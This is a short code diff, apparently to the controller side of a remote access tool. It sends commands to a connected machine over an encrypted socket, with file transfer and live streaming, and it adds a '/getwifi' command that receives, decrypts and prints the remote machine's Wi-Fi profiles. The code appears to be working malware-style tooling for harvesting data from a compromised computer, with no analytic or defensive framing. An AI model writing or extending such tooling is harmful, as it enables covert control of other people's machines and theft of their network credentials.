@@ -245,10 +245,15 @@ while True:
             receiver.stop_server()
             receiver = StreamingServer(IPAddr, 422)
             continue
+        if command == "/getwifi":
+            print(f"[{IMPORTANT}] Getting wifi profiles\n")
+            get_wifi = client_socket.recv(BUFFER_SIZE)
+            get_wifi = Fernet(key).decrypt(get_wifi).decode()
+            print(get_wifi)
         output = client_socket.recv(BUFFER_SIZE)
         output = Fernet(key).decrypt(output).decode()
         results, cwd = output.split(SEPARATOR)
-        if command != "/getfile" and command != "/sendfile" and command != "/getlive" and command != "/stoplive":
+        if command != "/getfile" and command != "/sendfile" and command != "/getlive" and command != "/stoplive" and command != "/getwifi":
             print(f"{GREEN}{results}{END}")
         else: continue
     except KeyboardInterrupt:
